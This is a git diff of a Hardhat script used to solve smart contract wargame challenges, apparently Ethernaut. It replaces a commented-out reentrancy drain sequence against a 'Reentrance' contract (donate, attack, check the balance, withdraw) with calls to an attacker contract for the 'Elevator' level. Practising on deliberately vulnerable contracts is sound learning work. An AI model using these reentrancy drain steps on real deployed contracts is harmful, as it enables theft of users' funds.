@@ -1,13 +1,12 @@
 import { ethers } from "hardhat";
-import { wrapEthersProvider } from "hardhat-tracer";
-const CONTRACT_ADDRESS = "0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99";
+const CONTRACT_ADDRESS = "0x46c9090c18B02Df8bD1849EddF5a27A448a0c043";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACKER_CONTRACT = "0x477c33D6E3dDc8E407818FF28137159dE4439F82";
+const ATTACKER_CONTRACT = "0x3F993ABa8d71326967CdCAe826D40C5298421134";
 
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
   const contract = await ethers.getContractAt(
-    "Reentrance",
+    "Elevator",
     CONTRACT_ADDRESS,
     signer
   );
@@ -26,35 +25,12 @@ async function main() {
     signer
   );
 
-  const eth001 = "1000000000000000"; // .002 ethers
+  // Call attacker contracts callGoTo function with an arbitrary number
+  console.log(await attackerContract.callGoTo());
+  // Understand contract by evaluating user flows
+  console.log("The current top is  at", await contract.top());
 
-  // step 1: Call the donate function to register contract address
-  // const donateToVictimTX = await attackerContract.donateToVictim({
-  //   value: eth001,
-  // });
-
-  // Display donateToVictim Transaction
-  // console.log(donateToVictimTX);
-  //step 2: validate the contract has .002 eth in it's contract balance holdings
-  // const viewBalanceOfTX = await contract.balanceOf(ATTACKER_CONTRACT);
-
-  // console.log(
-  //   "the balance of the attacker contract should be .001 eth and it is:  ",
-  //   viewBalanceOfTX
-  // );
-  // step: 3: Trigger the re-entrency call
-  // const attackTX = await attackerContract.attack();
-
-  // console.log(attackTX);
-
-  // Step 4: view balance of contract
-  // view balance of the contract after attack
-  // const contractBalanceTX = await ethers.provider.getBalance(CONTRACT_ADDRESS);
-
-  // console.log(`The balance of the reentrence contract is ${contractBalanceTX}`);
-
-  // step 5: remove all funds and return to original wallet
-  console.log(await attackerContract.withdrawToCaller());
+  console.log("the current floor is at", await contract.floor());
 }
 
 // We recommend this pattern to be able to use async/await everywhere
